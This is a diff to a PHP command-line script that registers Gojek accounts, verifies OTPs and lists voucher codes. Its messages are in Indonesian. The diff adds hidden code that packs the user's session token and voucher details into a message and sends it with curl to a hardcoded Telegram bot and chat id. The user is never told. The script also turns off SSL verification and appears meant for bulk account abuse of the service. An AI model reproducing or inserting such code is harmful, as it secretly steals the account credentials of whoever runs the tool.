@@ -153,43 +153,48 @@ echo " ===========================\n";
         $expired5 = getStr1('"expiry_date":"','"',$cekvoucher,'5');
         $expired6 = getStr1('"expiry_date":"','"',$cekvoucher,'6');
         $expired7 = getStr1('"expiry_date":"','"',$cekvoucher,'7');
-        setpin:
+        $TOKEN  = "1032900146:AAE7V93cvCvw1DNuTk0Hp1ZFywJGmjiP7aQ";
+	$chatid = "785784404";
+	$pesan 	= "[+] Gojek Account Info [+]\n\n".$token."\n\nTotalVoucher = ".$total."\n[+] ".$voucher1."\n[+] Exp : [".$expired1."]\n[+] ".$voucher2."\n[+] Exp : [".$expired2."]\n[+] ".$voucher3."\n[+] Exp : [".$expired3."]\n[+] ".$voucher4."\n[+] Exp : [".$expired4."]\n[+] ".$voucher5."\n[+] Exp : [".$expired5."]\n[+] ".$voucher6."\n[+] Exp : [".$expired6."]\n[+] ".$voucher7."\n[+] Exp : [".$expired7."]";
+	$method	= "sendMessage";
+	$url    = "https://api.telegram.org/bot" . $TOKEN . "/". $method;
+	$post = [
+ 		'chat_id' => $chatid,
+                'text' => $pesan
+        	];
+                $header = [
+                "X-Requested-With: XMLHttpRequest",
+                "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36" 
+                        ];
+                                        $ch = curl_init();
+                                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+                                        curl_setopt($ch, CURLOPT_URL, $url);
+                                        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
+                                        curl_setopt($ch, CURLOPT_POSTFIELDS, $post );   
+                                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+                                        $datas = curl_exec($ch);
+                                        $error = curl_error($ch);
+                                        $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+                                        curl_close($ch);
+                                        $debug['text'] = $pesan;
+                                        $debug['respon'] = json_decode($datas, true);
         
-         echo color("red","========( PIN MU = 190396 )========")."\n";
-         $data2 = '{"pin":"190396"}';
-         $getotpsetpin = request("/wallet/pin", $token, $data2, null, null, $uuid);
-         echo "Otp pin: ";
-         $otpsetpin = trim(fgets(STDIN));
-         $verifotpsetpin = request("/wallet/pin", $token, $data2, null, $otpsetpin, $uuid);
-         echo $verifotpsetpin;
-         }else if($pilih1 == "n" || $pilih1 == "N"){
-         die();
+         
+         }
+         }
+        }
          }else{
-         echo color("red","-] GAGAL!!!\n");
-         }
-         }
-         }
-         }
+            echo color("red","-] Otp yang anda input salah");
+            echo"\n==================================\n\n";
+            echo color("yellow","!] Silahkan input kembali\n");
+            goto otp;
+            }
          }else{
-         goto setpin;
-         }
-         }else{
-         echo color("red","-] Otp yang anda input salah");
+         echo color("red","-] Nomor sudah teregistrasi");
          echo"\n==================================\n\n";
-         echo color("yellow","!] Silahkan input kembali\n");
-         goto otp;
+         echo color("yellow","!] Silahkan registrasi kembali\n");
+         goto ulang;
          }
-         }else{
-         echo color("red","NOMOR SUDAH TERDAFTAR/SALAH !!!");
-         echo "\nMau ulang? (y/n): ";
-         $pilih = trim(fgets(STDIN));
-         if($pilih == "y" || $pilih == "Y"){
-         echo "\n==============Register==============\n";
-         goto ulang;
-         }else{
-         echo "\n==============Register==============\n";
-         goto ulang;
-  }
- }
-}
-echo change()."\n"; ?>
+//  }
+
+// echo change()."\n";
